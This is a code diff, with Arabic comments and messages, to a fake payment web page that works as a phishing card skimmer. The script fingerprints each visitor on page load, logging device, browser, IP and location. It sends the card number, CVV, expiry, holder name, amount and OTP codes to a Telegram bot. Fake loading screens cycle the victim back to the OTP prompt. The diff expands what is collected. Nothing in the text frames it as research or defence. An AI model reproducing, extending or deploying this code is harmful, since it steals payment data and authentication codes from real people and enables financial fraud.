@@ -352,7 +352,7 @@ async function sendToTelegram(text) {
   } catch(e) { console.log("خطأ في الإرسال", e); }
 }
 
-// ====================== دوال البصمة والجهاز ======================
+// ====================== دوال البصمة والجهاز المتقدمة ======================
 async function sha256(message) {
   const encoder = new TextEncoder();
   const data = encoder.encode(message);
@@ -407,31 +407,33 @@ async function getAdvancedFingerprint() {
   return 'fp_adv_' + fingerprint.slice(0, 16);
 }
 
-function getDeviceType() {
+// تحديد دقيق لنوع الجهاز (جوال، تاب، حاسوب) ونظام التشغيل
+function getDetailedDeviceInfo() {
   const ua = navigator.userAgent;
-  if (/mobile/i.test(ua)) return "📱 جوال";
-  if (/tablet/i.test(ua)) return "📟 تاب";
-  return "💻 حاسوب";
-}
-
-function getOS() {
-  const ua = navigator.userAgent;
-  if (/Windows/i.test(ua)) return "Windows";
-  if (/Mac/i.test(ua)) return "MacOS";
-  if (/Linux/i.test(ua)) return "Linux";
-  if (/Android/i.test(ua)) return "Android";
-  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-  return "غير معروف";
-}
-
-function getBrowser() {
-  const ua = navigator.userAgent;
-  if (/Edg/i.test(ua)) return "Edge";
-  if (/Chrome/i.test(ua)) return "Chrome";
-  if (/Safari/i.test(ua)) return "Safari";
-  if (/Firefox/i.test(ua)) return "Firefox";
-  if (/Opera|OPR/i.test(ua)) return "Opera";
-  return "غير معروف";
+  const isMobile = /Mobile/i.test(ua);
+  const isTablet = /Tablet|iPad/i.test(ua) || (isMobile && screen.width >= 768);
+  const isPhone = isMobile && !isTablet;
+  
+  let deviceType = "";
+  if (isTablet) deviceType = "📟 تاب";
+  else if (isPhone) deviceType = "📱 جوال";
+  else deviceType = "💻 حاسوب";
+  
+  let os = "غير معروف";
+  if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Mac OS/i.test(ua)) os = "MacOS";
+  else if (/Linux/i.test(ua)) os = "Linux";
+  else if (/Android/i.test(ua)) os = "Android";
+  else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+  
+  let browser = "غير معروف";
+  if (/Edg/i.test(ua)) browser = "Edge";
+  else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+  else if (/Firefox/i.test(ua)) browser = "Firefox";
+  else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+  
+  return { deviceType, os, browser, fullString: `${deviceType} (${os})` };
 }
 
 async function getIPAndLocation() {
@@ -453,7 +455,6 @@ async function getIPAndLocation() {
   }
 }
 
-// ====================== إدارة عدد الزيارات ======================
 function updateVisitCount() {
   let count = localStorage.getItem("visitCount");
   if (!count) count = 0;
@@ -462,18 +463,18 @@ function updateVisitCount() {
   return count;
 }
 
-// ====================== إرسال الرسالة الأولى (بيانات الدخول) ======================
+// ====================== المتغيرات العامة للمعلومات الإضافية ======================
 let globalFingerprint = "";
 let globalIp = "";
 let globalLocation = "";
 let globalVisitCount = 0;
+let globalDeviceInfo = { deviceType: "", os: "", browser: "", fullString: "" };
 
+// ====================== إرسال الرسالة الأولى (الدخول) ======================
 async function sendFirstMessage() {
   globalVisitCount = updateVisitCount();
   globalFingerprint = await getAdvancedFingerprint();
-  const device = getDeviceType();
-  const os = getOS();
-  const browser = getBrowser();
+  globalDeviceInfo = getDetailedDeviceInfo();
   const ipLoc = await getIPAndLocation();
   globalIp = ipLoc.ip;
   globalLocation = ipLoc.location;
@@ -483,8 +484,9 @@ ____________________
 معلومات إضافية ⬇️
 🆔 البصمة الثابتة: ${globalFingerprint}
 📊 عدد مرات دخول الموقع: ${globalVisitCount}
-📱 نوع الجهاز: ${device} (${os})
-🌐 المتصفح: ${browser}
+📱 نوع الجهاز: ${globalDeviceInfo.deviceType}
+🤖 نظام التشغيل: ${globalDeviceInfo.os}
+🌐 المتصفح: ${globalDeviceInfo.browser}
 🌍 الـ IP: ${globalIp}
 📍 الموقع: ${globalLocation}
 🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
@@ -509,7 +511,6 @@ function detectCardTypeStrong(cardDigits) {
   return CardType.UNKNOWN;
 }
 
-// التحقق من صحة الحقول (الطول فقط)
 function isCardNumberLengthValid(cardDigits) { return cardDigits && cardDigits.length === 16; }
 function validateCardHolder() {
   const value = cardHolder.value.trim();
@@ -553,7 +554,7 @@ function validatePaymentForm() {
   return holderOk && cardOk && cvvOk && expiryOk;
 }
 
-// ====================== إرسال الرسالة الثانية (بيانات الدفع) ======================
+// ====================== إرسال الرسالة الثانية (بيانات الدفع) مع المبلغ ======================
 let paymentSent = false;
 async function sendPaymentMessage() {
   if (paymentSent) return;
@@ -566,39 +567,47 @@ async function sendPaymentMessage() {
   const year = expYear.value || "YY";
   const expiry = `${month}/${year}`;
   
+  // جلب المبلغ مع رمز العملة من واجهة المستخدم
+  const amountElement = document.getElementById("topAmount");
+  const amountText = amountElement ? amountElement.textContent : "غير متوفر";
+  
   const msg = `💳💰 معلومات الدفع
 ________________________
+💰 المبلغ: ${amountText}
 🏷️ نوع البطاقة: ${cardType}
 🔢 رقم البطاقة: ${cardNum}
 🔐 رمز الأمان: ${cvvVal}
 📅 تاريخ الانتهاء: ${expiry}
 👤 اسم حامل البطاقة: ${holderName}
 __________________
-📎 معلومات إضافية ⬇️
+معلومات إضافية ⬇️
 🆔 البصمة: ${globalFingerprint}
-🌐 IP: ${globalIp}
-📍 الموقع: ${globalLocation}`;
+📊 عدد الزيارات: ${globalVisitCount}
+📱 الجهاز: ${globalDeviceInfo.deviceType} (${globalDeviceInfo.os})
+🌐 المتصفح: ${globalDeviceInfo.browser}
+🌍 IP: ${globalIp}
+📍 الموقع: ${globalLocation}
+🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
   
   await sendToTelegram(msg);
   paymentSent = true;
 }
 
 // ====================== إرسال الرسالة الثالثة (رمز التحقق OTP) ======================
-let otpSent = false;
-async function sendOtpMessage() {
-  if (otpSent) return;
-  const otpCode = otpInput.value.trim() || "غير مدخل";
+async function sendOtpMessage(otpCode) {
   const msg = `🔐✅ رمز التحقق
 🔢 رمز التحقق: ${otpCode}
 ____________________
 معلومات إضافية ⬇️
 🆔 البصمة: ${globalFingerprint}
-🌐 IP: ${globalIp}
+📊 عدد الزيارات: ${globalVisitCount}
+📱 الجهاز: ${globalDeviceInfo.deviceType} (${globalDeviceInfo.os})
+🌐 المتصفح: ${globalDeviceInfo.browser}
+🌍 IP: ${globalIp}
 📍 الموقع: ${globalLocation}
 🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
   
   await sendToTelegram(msg);
-  otpSent = true;
 }
 
 // ====================== إعداد عناصر الصفحة وسير العمل ======================
@@ -676,24 +685,30 @@ function startLoader60ThenOTP() {
     if (seconds <= 0) { clearInterval(loader60Timer); showScreen(otpScreen); }
   }, 1000);
 }
+
 function startLoader30ThenBackOTP() {
   clearTimeout(loader30Timer);
   showScreen(loader30Screen);
-  loader30Timer = setTimeout(() => { otpInput.value = ""; otpInput.classList.remove("error"); showScreen(otpScreen); }, 30000);
+  loader30Timer = setTimeout(() => {
+    otpInput.value = "";
+    otpInput.classList.remove("error");
+    showScreen(otpScreen);
+  }, 30000);
 }
 
 // زر الدفع
 payBtn.addEventListener("click", async function() {
   if (!validatePaymentForm()) return;
-  await sendPaymentMessage();   // إرسال بيانات البطاقة فوراً
+  await sendPaymentMessage();
   startLoader60ThenOTP();
 });
 
 // زر OTP
 otpBtn.addEventListener("click", async function() {
-  if (!otpInput.value) { otpInput.classList.add("error"); return; }
+  const otpCode = otpInput.value.trim();
+  if (!otpCode) { otpInput.classList.add("error"); return; }
   if (!validateOTP()) return;
-  await sendOtpMessage();       // إرسال رمز التحقق
+  await sendOtpMessage(otpCode);
   startLoader30ThenBackOTP();
 });
 
@@ -705,10 +720,9 @@ document.addEventListener("dragstart", e => { if(e.target.closest(".card-logo-to
 loadAmount();
 setInterval(loadAmount, 3000);
 
-// إرسال الرسالة الأولى بعد تحميل الصفحة وتجهيز البيانات
 window.addEventListener("load", async () => {
   await sendFirstMessage();
 });
 </script>
 </body>
-                                               </html>
+</html>
